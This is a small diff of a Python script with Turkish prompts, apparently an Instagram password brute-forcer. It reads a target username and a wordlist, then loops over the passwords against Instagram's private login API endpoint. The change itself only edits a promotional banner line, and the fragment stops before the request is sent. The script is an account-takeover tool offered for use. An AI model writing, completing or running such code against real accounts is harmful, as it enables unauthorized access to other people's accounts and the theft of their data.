@@ -7,7 +7,7 @@ S = '\033[1;33m'
 Z = '\033[1;31m' 
 username=input(Z+'[♡] Kullanıcı adı giriniz ==> ')
 passlist=input(S+'[◇] Wordlist giriniz ==> ')
-print('======Join @SenicMedya=========')
+print('======CYBER İMPACT=========')
 for Whisper in open(passlist,'r').read().splitlines():
  password=str(Whisper.split('\n')[0])
  url = 'https://b.i.instagram.com/api/v1/accounts/login/'
